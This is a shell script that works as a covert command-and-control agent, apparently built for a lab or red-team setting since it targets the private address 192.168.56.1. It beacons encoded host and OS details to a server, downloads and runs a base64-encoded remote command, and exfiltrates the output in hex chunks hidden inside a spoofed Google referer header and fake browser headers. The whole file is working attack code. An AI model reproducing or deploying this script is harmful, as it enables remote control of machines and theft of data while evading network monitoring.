#!/bin/sh
OS=`uname`
OSv1=`printf '%s' " $OS " | base64 | xxd -p | rev`
Hostid=`hostname -I | base64 | xxd -p | rev`
HOSid=`echo $Hostid$OSv1`
sleep 1
# sending signal as client to detect by server 
curl "http://192.168.56.1/default.aspx?Session=$HOSid"
sleep 1
read -p "press enter to continue..." input
# dumping information about cmd from server 
nohup curl "http://192.168.56.1/getcmd.aspx" > "dumpcmds.log" 2>&1 &
sleep 2.5
# detecting cmd 
mycmd=`strings "dumpcmds.log" | grep "myTimeLabel_CMD" | cut -d'>' -f2 | cut -d'<' -f1 | base64 -d`
sleep 1
	#executing cmd
	output=`$mycmd`
	_Random2=`head /dev/urandom | tr -dc 0-9a-f | head -c8`
	sleep 1
	LocalhostIPv4=`hostname -I`
	output=`echo "[$LocalhostIPv4] => "$output`
	# data/cmd-output sending via chunked (uids=bytes).values start
	for bytes in `echo $output | xxd -p -c 12 | rev`;
	do
	sleep 1.5
	# nohup curl "http://192.168.56.1/default.aspx?uids=$bytes" > out.txt  2>&1 &
 			nohup curl -v \
			-H "Host: 192.168.56.1" -H 'Connection: keep-alive' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
			-H 'Accept-Language: en-US;q=0.8,en;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H "Accept-Encoding: gzip, deflate" \
			-e "https://www.google.com/search?ei=bsZAXPSqD&uids=$bytes&q=$_Random2&oq=a0d3d377b&gs_l=psy-ab.3.........0....1..gws-wiz.IW6_Q" \
			-A 'Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0' \
			"http://192.168.56.1/default.aspx" > "out.txt" 2>&1 &	
	done
	# data/cmd-output sending via chunked (uids=bytes).values done
sleep 1.5
# sending signal to server for "cmd-output Exfiltration finish"
nohup curl "http://192.168.56.1/default.aspx?logoff=null" > out.txt  2>&1 &
